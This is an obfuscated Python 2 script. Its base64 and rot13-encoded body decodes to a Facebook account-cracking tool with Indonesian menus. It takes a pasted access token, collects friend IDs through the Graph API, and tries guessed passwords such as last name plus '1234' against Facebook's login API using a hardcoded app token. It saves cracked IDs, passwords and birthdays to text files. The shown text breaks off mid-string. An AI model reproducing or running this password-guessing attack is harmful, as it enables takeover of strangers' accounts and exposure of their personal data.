# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'IyEvdXNyL2Jpbi9weXRob24yDQojIGNvZGluZz11dGYtOA0KDQojSW1wb3J0IG1vZHVsZQ0KaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLGdldHBhc3MsdXJsbGliLGNvb2tpZWxpYg0KZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbA0KdHJ5Og0KCWltcG9ydCBtZWNoYW5pemUNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBtZWNoYW5pemUiKQ0KdHJ5Og0KCWltcG9ydCBiczQNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCglvcy5zeXN0ZW0oInBpcDIgaW5zdGFsbCBiczQiKQ0KdHJ5Og0KCWltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KCW9zLnN5c3RlbSgicGlwMiBpbnN0YWxsIHJlcXVlc3RzIikNCglvcy5zeXN0ZW0oInB5dGhvbjIgcnluLnB5IikNCmZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpmcm9tIG1lY2hhbml6ZSBpbXBvcnQgQnJvd3NlciANCg0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQ0KYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpDQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkNCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSxtYXhfdGltZT0xKQ0KYnIuYWRkaGVhZGVycyA9IFsoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDk7IEFTVVNfWDAwVEQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84NS4wLjQxODMuMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JyldDQoNCmRlZiBrZWx1YXIoKToNCglwcmludCAoIlshXSBFeGl0IikNCglvcy5zeXMuZXhpdCgpDQoJDQoJDQpkZWYgYWNhayh4KToNCiAgICB3ID0gJ21oa2JwY1AnDQogICAgZCA9ICcnDQogICAgZm9yIGkgaW4geDoNCiAgICAgICAgZCArPSAnIScrd1tyYW5kb20ucmFuZGludCgwLGxlbih3KS0xKV0raQ0KICAgIHJldHVybiBjZXRhayhkKQ0KICAgIA0KICAgIA0KZGVmIGNldGFrKHgpOg0KICAgIHcgPSAnbWhrYnBjUCcNCiAgICBmb3IgaSBpbiB3Og0KICAgICAgICBqID0gdy5pbmRleChpKQ0KICAgICAgICB4PSB4LnJlcGxhY2UoJyElcyclaSwnJXM7JyVzdHIoMzEraikpDQogICAgeCArPSAnJw0KICAgIHggPSB4LnJlcGxhY2UoJyEwJywnJykNCiAgICBzeXMuc3Rkb3V0LndyaXRlKHgrJ1xuJykNCg0KDQpkZWYgamFsYW4oeik6DQoJZm9yIGUgaW4geiArICdcbic6DQoJCXN5cy5zdGRvdXQud3JpdGUoZSkNCgkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCXRpbWUuc2xlZXAoMC4wNikNCg0KDQoNCiMjIyMjIyMjI0xPR08jIyMjIyMjIyMNCmxvZ28gPSAiIiINClwwMzNbMTs5N20gX19fX19fICAgX19fICAgXyBfICAgXyBfICAgXw0KXDAzM1sxOzk3bXwgICAgXCBcIC8gLyBcIHwgfCBcIHwgfCBcIHwgfA0KXDAzM1sxOzk3bXwgfF8pIFwgViAvfCAgXHwgfCAgXHwgfCAgXHwgfA0KXDAzM1sxOzk3bXwgIF8gPCB8IHwgfCB8XCAgfCB8XCAgfCB8XCAgfA0KXDAzM1sxOzk3bXxffCBcX1x8X3wgfF98IFxffF98IFxffF98IFxffA0KIiIiDQoNCmJhY2sgPSAwDQp0aHJlYWRzID0gW10NCmJlcmhhc2lsID0gW10NCmNla3BvaW50ID0gW10NCm9rcyA9IFtdDQpva2UgPSBbXQ0KY3BlID0gW10NCmlkID0gW10NCnVzZXJuYW1lID0gW10NCmlkdGVtYW4gPSBbXQ0KaWRmcm9tdGVtYW4gPSBbXQ0KZ2FnYWwgPSBbXQ0KdnVsbm90ID0gIk5vdCBWdWxuIg0KdnVsbiA9ICJWdWxuIg0KDQojIyMjIyNNQVNVSyMjIyMjIw0KZGVmIG1hc3VrKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdtIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyINCglwcmludCAiXDAzM1sxOzk3bSAxLilcMDMzWzE7OTdtIExvZ2luIERlbmdhbiBUb2tlbiINCglwcmludCAiXDAzM1sxOzk3bSAyLilcMDMzWzE7OTdtIEFtYmlsIFRva2VuIg0KCXByaW50ICJcMDMzWzE7OTdtIDAuKVwwMzNbMTs5N20gS2VsdWFyIg0KCXByaW50ICJcMDMzWzE7OTdtIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyINCglwaWxpaF9tYXN1aygpDQoNCmRlZiBwaWxpaF9tYXN1aygpOg0KCW1zdWsgPSByYXdfaW5wdXQoIlwwMzNbMTs5N20gUnlubm46KSAiKQ0KCWlmIG1zdWsgPT0iIjoNCgkJcHJpbnQiXDAzM1sxOzk3bSBJc2kgU2luZyBCZW5lciBDb2sgISIgJ1xuJw0KCQlwaWxpaF9tYXN1aygpDQoJZWxpZiBtc3VrID09IjEiIG9yIG1zdWsgPT0iMDEiOg0KCQl0b2tlbnooKQ0KCWVsaWYgbXN1ayA9PSIyIm9yIG1zdWsgPT0iMDIiOg0KCQlBbWJpbF9Ub2tlbigpDQoJZWxpZiBtc3VrID09IjAiIG9yIG1zdWsgPT0iMDAiOg0KCQlrZWx1YXIoKQ0KCWVsc2U6DQoJCXByaW50IlwwMzNbMTs5N20gSXNpIFNpbmcgQmVuZXIgQ29rICEiDQoJCXBpbGloX21hc3VrKCkNCg0KDQojIyMjI0xPR0lOX1RPS0VOWiMjIyMjDQpkZWYgdG9rZW56KCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICdfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18nDQoJdG9rZXQgPSByYXdfaW5wdXQoIlwwMzNbMTs5N20gUGFzdGUgVG9rZW4gTmRlayBLZW5lOiIpDQoJdHJ5Og0KCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3Rva2V0KQ0KCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJbmFtYSA9IGFbJ25hbWUnXQ0KCQl6ZWRkID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQ0KCQl6ZWRkLndyaXRlKHRva2V0KQ0KCQl6ZWRkLmNsb3NlKCkNCgkJamFsYW4gKCdcMDMzWzE7OTJtIFRva2VuIEJlbmVyIOKckycpDQoJCW1lbnUoKQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgIlwwMzNbMTs5M20gVG9rZW4gU2FsYWggQ29rICEiDQoJCXRpbWUuc2xlZXAoMSkNCgkJbWFzdWsoKQ0KDQojIyMjIyNBTUJJTF9UT0tFTiMjIyMjIw0KZGVmIEFtYmlsX1Rva2VuKCk6DQoJb3Muc3lzdGVtKCJjbGVhciIpDQoJcHJpbnQgbG9nbw0KCXByaW50IDUwKiAiXDAzM1sxOzk3beKUgCINCglqYWxhbigiXDAzM1sxOzk3bUFuZGEgQWthbiBEaSBBcmFoa2FuIEtlIEJyb3dzZXIgTGFsdSBTZWFyY2ggJ2VhYWEnIEtlbXVkaWFuIENvcHkgVG9rZW4uIikNCglvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vY29tcG9zZXIvb2NlbG90L2FzeW5jX2xvYWRlci8/cHVibGlzaGVyPWZlZWQnKQ0KCXRpbWUuc2xlZXAoMykNCgltYXN1aygpDQoNCiMjIyMjI01FTlUjIyMjIyMjDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJbWFzdWsoKQ0KCXRyeToNCgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCW5hbWEgPSBhWyduYW1lJ10NCgkJaWQgPSBhWydpZCddDQoJZXhjZXB0IEtleUVycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQiXDAzM1sxOzkxbSBUb2tlbiBXZXMgQm9zb2sgISINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQltYXN1aygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCIgT3JhIE9ubyBJbnRlcm5ldCINCgkJa2VsdWFyKCkNCglvcy5zeXN0ZW0oImNsZWFyIikNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5N20gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIg0KCXByaW50ICJcMDMzWzE7OTdtIFNlbGFtYXQgRGF0YW5nXDAzM1sxOzk3bSAiK25hbWENCglwcmludCAiXG5cMDMzWzE7OTdtIFVTRVIgSURcMDMzWzE7OTdtICAgICAgICAgLT5cMDMzWzE7OTdtICIraWQNCglwcmludCAiXDAzM1sxOzk3bSBUYW5nZ2FsIExhaGlyXDAzM1sxOzk3bSAgIC0+XDAzM1sxOzk3bSAiKyBhWydiaXJ0aGRheSddDQoJcHJpbnQgIlwwMzNbMTs5N20gX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIg0KCXByaW50ICJcMDMzWzE7OTdtIDEuKSBNdWxhaSBDcmFjayINCglwcmludCAiXDAzM1sxOzk3bSAyLikgQW1iaWwgSWQgRGVuZ2FuIFVzZXJuYW1lIg0KCXByaW50ICJcMDMzWzE7OTdtIDAuKSBMb2dvdXQgXG4iDQoJcGlsaWgoKQ0KDQojIyMjIyNQSUxJSCMjIyMjIw0KZGVmIHBpbGloKCk6DQoJdW5pa2VycyA9IHJhd19pbnB1dCgiXDAzM1sxOzk3bSBSeW5ubjopICIpDQoJaWYgdW5pa2VycyA9PSIiOg0KCQlwcmludCAiXDAzM1sxOzk3bSBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18iDQoJCXBpbGloKCkNCgllbGlmIHVuaWtlcnMgPT0iMSIgb3IgdW5pa2VycyA9PSIwMSI6DQoJCWluZG8oKQ0KCWVsaWYgdW5pa2VycyA9PSIyIiBvciB1bmlrZXJzID09IjAyIjoNCgkJaWRfZ2VuKCkNCgllbGlmIHVuaWtlcnMgPT0iMCIgb3IgdW5pa2VycyA9PSIwMCI6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlqYWxhbignTWVuZ2hhcHVzIHRva2VuJykNCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJa2VsdWFyKCkNCgllbHNlOg0KCQlwcmludCJcMDMzWzE7OTdtIElzaSBTaW5nIEJlbmVyIENvayAhIg0KCQlwaWxpaCgpDQoNCg0KIyMjIyMjIyMjIyBDUkFDSyBJTkRPTkVTSUEgIyMjIyMjIw0KZGVmIGluZG8oKToNCglnbG9iYWwgdG9rZXQNCgl0cnk6DQoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXDAzM1sxOzkxbSBUb2tlbiBXZXMgQm9zb2sgISINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlrZWx1YXIoKQ0KCXByaW50ICJcMDMzWzE7OTdtIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyINCglwcmludCAiXDAzM1sxOzk3bSAxLikgQ3JhY2sgRGFyaSBEYWZ0YXIgVGVtYW4iDQoJcHJpbnQgIlwwMzNbMTs5N'
love = '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'
god = '0gLS0+ICcgKyB1c2VyICsgJ3wnICsgcGFzczQgKyAnfCcgKyBjWydiaXJ0aGRheSddDQoJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M0KQ0KCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gd1snZXJyb3JfbXNnJ106DQoJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTNtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M0ICsgJ3wnICsgY1snYmlydGhkYXknXQ0KCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQljZWsud3JpdGUoIlxuSUQ6IiArdXNlcisgIiBQdzoiICtwYXNzNCsgIiBUVEw6IiArY1snYmlydGhkYXknXSkNCgkJCQkJCQkJCQkJY2VrLmNsb3NlKCkNCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpDQoJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJcGFzczUgPSBjWydsYXN0X25hbWUnXSsnMTIzNCcNCgkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQl3ID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHc6DQoJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49Iit3WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTJtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M1ICsgJ3wnICsgY1snYmlydGhkYXknXQ0KCQkJCQkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3M1KQ0KCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHdbJ2Vycm9yX21zZyddOg0KCQkJCQkJCQkJCQkJCXByaW50ICdcMDMzWzE7OTNtIC0tPiAnICsgdXNlciArICd8JyArIHBhc3M1ICsgJ3wnICsgY1snYmlydGhkYXknXQ0KCQkJCQkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlc